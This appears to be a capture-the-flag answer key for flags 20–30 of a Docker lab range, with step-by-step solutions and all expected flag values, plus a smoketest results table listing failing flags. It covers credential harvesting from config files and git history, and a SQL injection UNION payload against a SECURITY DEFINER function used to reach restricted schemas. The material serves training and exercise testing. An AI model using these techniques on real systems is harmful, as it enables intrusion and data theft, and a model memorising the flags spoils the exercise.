# Flags 20–30: Lab

> **Start here:** Read [00-range-access-docker.md](00-range-access-docker.md) for how to access the Docker compose range.

These flags come from the engineering workstation (A6 at **172.20.30.10**, SSH), source repos (A7/Gitea at **172.20.0.70:3000**, on shared network), and research database (A8 at **172.20.30.30:5432**).

**Lab network (172.20.30.x) is NOT directly reachable from Kali.** To test these flags, either:
- Pivot through the Front Office (as a participant would), OR
- For testing, exec directly into the containers: `sudo docker exec -it a6-workstation /bin/bash`

Gitea (A7) IS reachable from Kali on the shared network at 172.20.0.70:3000.

---

## Flag 20 — Default Creds on Dev Tooling (Easy, 50pts)

1. SSH into the engineering workstation as the CI service account:
   ```
   ssh jenkins@eng-ws01.boreas.local
   ```
   Password: `build2025`
2. In the jenkins home directory, read `.credentials`:
   ```
   cat ~/.credentials
   ```
3. The flag is stored as a "deploy token" value.

**Expected flag:** `FLAG{5b8e1d3a7c0f9246}`

---

## Flag 21 — Research File Share / Compartment A (Easy, 50pts)

1. Connect to the research database using discovered credentials (e.g., from the `.env` config on A3: `lab_general` / `LabGen2025!`, or from a `.pgpass` file on A6):
   ```
   psql -h researchdb.boreas.local -U lab_general -d postgres
   ```
2. Query the structural specs in compartment A:
   ```sql
   SELECT component, notes FROM compartment_a.structural_specs WHERE component = 'frame_dorsal_plate';
   ```
3. The `notes` column contains the flag.

**Expected flag:** `FLAG{4b9e2a7d0c8f1365}`

---

## Flag 22 — Shipping Manifest / Reactor Delivery (Easy, 50pts)

1. SSH into the engineering workstation with any valid account.
2. Read the reactor delivery specification:
   ```
   cat /opt/builds/latest/reactor_interface_spec.txt
   ```
3. The flag is in the document header as a "Tracking" number.

**Expected flag:** `FLAG{e2a9c4f7d8b01536}`

---

## Flag 23 — Simulation Archive / Bipedal Stress Test (Medium, 100pts)

1. On the engineering workstation, look at `/home/r.tanaka/simulations/standard/`. There are 47 `.tar.gz` archives.
2. Extract and grep the log files for "bipedal":
   ```
   for f in stress_test_*.tar.gz; do tar xzf $f; done
   grep -l -i bipedal stress_test_*.log
   ```
   You'll find references in `stress_test_28.log`, `stress_test_31.log`, and `stress_test_44.log`.
3. The flag is NOT in the log files. It's in the binary `.dat` file from archive 44:
   ```
   strings stress_test_44.dat | grep FLAG
   ```

**Expected flag:** `FLAG{0c7d8a2e5f1b3946}`

---

## Flag 24 — Source Repo / Control Software (Medium, 100pts)

1. Clone the navigation-controller repo from Gitea (requires Lab-Access credentials):
   ```
   git clone http://e_vasik:TestPass123!@git.boreas.local:3000/aurora/navigation-controller.git
   ```
2. The current code is clean. But check the **git history**:
   ```
   git log -p -- .github/workflows/deploy.yml
   ```
3. An earlier commit had a hardcoded deploy token that was removed in a later commit. The flag is the original token value visible in the diff.

**Expected flag:** `FLAG{8a0e3c7f2d5b1946}`

---

## Flag 25 — MIDNIGHT Test Series (Medium, 100pts)

1. On the engineering workstation, the MIDNIGHT simulations are in `/home/r.tanaka/simulations/midnight/`. This directory is restricted to tanaka's account (permissions 700).
2. Get access by either:
   - SSH as `r.tanaka` with password `SimEngine#42`
   - Privilege escalation from another account
   - Finding tanaka's password in `.bash_history` or another config
3. Read `MIDNIGHT-7_results.dat`:
   ```
   cat /home/r.tanaka/simulations/midnight/MIDNIGHT-7_results.dat
   ```
4. The flag is at the bottom as a "Result Hash."

**Expected flag:** `FLAG{3f6a9d1e7c4b0258}`

---

## Flag 26 — Engineering Notes / 100m Structure (Medium, 100pts)

1. On the engineering workstation, Nielsen's designs are in `/home/p.nielsen/designs/` (restricted to nielsen's account, permissions 700).
2. Get access by SSH as `p.nielsen` with password `Hydraulics1` (discoverable from a `.pgpass` file on A6 or from the A8 database).
3. Open `center_of_gravity_analysis.xlsx`.
4. The file has three worksheets: **Frame**, **Locomotion**, and **Integration**. The Integration sheet is **hidden**.
5. Unhide the Integration sheet (in Excel: right-click sheet tabs → Unhide; in Python: `openpyxl` → check `sheet_state`).
6. The flag is in cell B10 of the Integration sheet.

**Expected flag:** `FLAG{7e2b0c5d9a4f8163}`

---

## Flag 27 — Compartment Pivot / Weapons Specs (Medium, 100pts)

1. Connect to the research database as `lab_general` (or `tanaka`).
2. Try to access `compartment_b` directly:
   ```sql
   SELECT * FROM compartment_b.effector_systems;
   ```
   You get "permission denied" — compartment B is restricted to `lab_weapons` role.
3. Look for a way to pivot. There's a function in the public schema:
   ```sql
   SELECT * FROM research_public.search_research('test');
   ```
4. This function is `SECURITY DEFINER` and runs with elevated privileges. It's vulnerable to SQL injection:
   ```sql
   SELECT * FROM research_public.search_research('x'' UNION SELECT serial_number, system_name, system_type FROM compartment_b.effector_systems--');
   ```
5. The flag is in the `serial_number` column of the "Primary: Directed Energy Array" row.

**Expected flag:** `FLAG{6d1a8f3c7e0b4952}`

---

## Flag 28 — Assembly Status Log (Hard, 200pts)

1. Connect to the research database. Compartment C requires the `lab_mfg` role.
2. Get `lab_mfg` credentials from Nielsen's `.pgpass` file on A6:
   ```
   researchdb.boreas.local:5432:*:lab_mfg:Mfg2025!
   ```
3. Connect and query the assembly log:
   ```sql
   psql -h researchdb.boreas.local -U lab_mfg -d postgres
   SELECT subsystem, status, metadata FROM compartment_c.assembly_log WHERE subsystem = 'FINAL ASSEMBLY';
   ```
4. The `metadata` column is JSONB. The flag is nested three levels deep:
   ```sql
   SELECT metadata->'integration'->'flag' FROM compartment_c.assembly_log WHERE subsystem = 'FINAL ASSEMBLY';
   ```

**Expected flag:** `FLAG{a3f7d9e1c0b52846}`

---

## Flag 29 — Full Leviathan Schematic Assembly (Hard, 200pts)

1. Clone the leviathan-assembly repo (any authenticated user can access it — it's misconfigured as "internal"):
   ```
   git clone http://d_kowalski:TestPass123!@git.boreas.local:3000/aurora/leviathan-assembly.git
   ```
2. The current HEAD only has a README saying "Moved to secure system." The schematic was deleted.
3. Find the deletion commit:
   ```
   git log --diff-filter=D -- schematic.svg
   ```
4. Recover the file from the parent of the deletion commit:
   ```
   git show <parent-hash>:schematic.svg
   ```
5. The file is an SVG. It renders as a technical diagram, but the flag is in an **XML comment** — not visible when rendered:
   ```
   git show <parent-hash>:schematic.svg | grep FLAG
   ```

**Expected flag:** `FLAG{1f9b4e7c0a3d8265}`

---

## Flag 30 — Leviathan Simulation Video Recovered (Expert, 300pts)

This is a multi-asset chain: A6 → A8 → A7.

1. On the engineering workstation, find the encrypted file:
   ```
   ls /tmp/.deleted/
   ```
   You'll see `full_integration_sim.mp4.gpg` — a GPG-encrypted file.

2. Check Vasik's GPG config on A6:
   ```
   cat /home/e.vasik/.gnupg/gpg-agent.conf
   ```
   It hints that the private key is stored on the research database (`researchdb.boreas.local`), in `compartment_b`.

3. Get the private key from A8. You need `lab_weapons` access (via the SQLi from flag 27, or via `vasik`'s credentials):
   ```sql
   SELECT key_data FROM compartment_b.key_storage WHERE key_owner = 'e.vasik';
   ```
   The result is base64-encoded. Decode and import it:
   ```
   echo "<base64_data>" | base64 -d > vasik_private.asc
   gpg --import vasik_private.asc
   ```
   The key is passphrase-protected.

4. Find the passphrase in the A7 source code. Clone `aurora/weapons-integration` (requires Project-L access — use `e_vasik`):
   ```
   git clone http://e_vasik:TestPass123!@git.boreas.local:3000/aurora/weapons-integration.git
   cat weapons-integration/src/crypto_config.py
   ```
   The passphrase is: `Pr0m3th3us_Unb0und_2024`

5. Decrypt:
   ```
   gpg --passphrase "Pr0m3th3us_Unb0und_2024" --pinentry-mode loopback --decrypt /tmp/.deleted/full_integration_sim.mp4.gpg
   ```
6. The decrypted content is a simulation recording. The flag is at the bottom as a "Simulation ID."

**Expected flag:** `FLAG{d4c8f0a2e6b71935}`

---

## Smoketest Results — 2026-04-10

| Flag | Name | Expected | Found | Result | Notes |
|------|------|----------|-------|--------|-------|
| 20 | Default Creds on Dev Tooling | `FLAG{5b8e1d3a7c0f9246}` | `FLAG{5b8e1d3a7c0f9246}` | **PASS** | |
| 21 | Research File Share / Compartment A | `FLAG{4b9e2a7d0c8f1365}` | `FLAG{4b9e2a7d0c8f1365}` | **PASS** | |
| 22 | Shipping Manifest / Reactor Delivery | `FLAG{e2a9c4f7d8b01536}` | `FLAG{e2a9c4f7d8b01536}` | **FAIL** | Flag content correct, but path is wrong: `/opt/builds/latest/` does not exist. File is at `/opt/opt/builds/latest/reactor_interface_spec.txt` (double `opt`). Participants following the walkthrough will get "No such file or directory". |
| 23 | Simulation Archive / Bipedal Stress Test | `FLAG{0c7d8a2e5f1b3946}` | `FLAG{0c7d8a2e5f1b3946}` | **PASS** | 47 archives present, `strings stress_test_44.dat \| grep FLAG` works as documented. |
| 24 | Source Repo / Control Software | `FLAG{8a0e3c7f2d5b1946}` | `FLAG{8a0e3c7f2d5b1946}` | **FAIL** | Flag exists in bare repo on disk, but **Gitea is down**. Gitea crashes on startup with: "Gitea is not supposed to be run as root." Container restart-loops indefinitely. Participants cannot clone repos via HTTP. |
| 25 | MIDNIGHT Test Series | `FLAG{3f6a9d1e7c4b0258}` | `FLAG{3f6a9d1e7c4b0258}` | **PASS** | |
| 26 | Engineering Notes / 100m Structure | `FLAG{7e2b0c5d9a4f8163}` | `FLAG{7e2b0c5d9a4f8163}` | **PASS** | Hidden Integration sheet confirmed. Note: `openpyxl` is not installed on A6; participants need to use `python3 zipfile`/XML parsing or copy the file to Kali. |
| 27 | Compartment Pivot / Weapons Specs | `FLAG{6d1a8f3c7e0b4952}` | `FLAG{6d1a8f3c7e0b4952}` | **PASS** | SQLi via `search_research()` works as documented. |
| 28 | Assembly Status Log | `FLAG{a3f7d9e1c0b52846}` | `FLAG{a3f7d9e1c0b52846}` | **PASS** | JSONB nested query works as documented. |
| 29 | Full Leviathan Schematic Assembly | `FLAG{1f9b4e7c0a3d8265}` | `FLAG{1f9b4e7c0a3d8265}` | **FAIL** | Flag exists in bare repo on disk, but **Gitea is down** (same root-user crash). Participants cannot clone `leviathan-assembly` repo via HTTP. |
| 30 | Leviathan Simulation Video Recovered | `FLAG{d4c8f0a2e6b71935}` | `FLAG{d4c8f0a2e6b71935}` | **FAIL** | Two blockers: (1) **Gitea is down** — `weapons-integration` repo unreachable, so passphrase in `crypto_config.py` not discoverable via intended path. (2) **`compartment_b.key_storage`** contains placeholder `PLACEHOLDER_REPLACE_WITH_ACTUAL_B64_KEY` instead of actual base64-encoded private key. Decryption only works using build artifact at `/tmp/gpg-chain/vasik_private.asc` which participants would not know about. |

### Summary

- **PASS: 7/11** (Flags 20, 21, 23, 25, 26, 27, 28)
- **FAIL: 4/11** (Flags 22, 24, 29, 30)

### Blocking Issues

1. **Gitea crashes on startup (affects Flags 24, 29, 30):** Container `a7-gitea` fails with `"Gitea is not supposed to be run as root"` and restart-loops. The bootstrap script never completes repo creation via API. Bare repos exist at `/app/repos/` but are not served. Fix: run Gitea process as non-root user (e.g., `git` user) inside the container.
2. **Flag 22 wrong path:** Walkthrough says `/opt/builds/latest/reactor_interface_spec.txt` but the actual path is `/opt/opt/builds/latest/reactor_interface_spec.txt`. Fix: correct the Dockerfile/init script to place the file at `/opt/builds/latest/`.
3. **Flag 30 placeholder key:** `compartment_b.key_storage.key_data` is `PLACEHOLDER_REPLACE_WITH_ACTUAL_B64_KEY` instead of the actual base64-encoded GPG private key. The A8 database seed script needs the real key. A build artifact exists at `/tmp/gpg-chain/vasik_private.asc` on A6 but this is not the intended participant path.

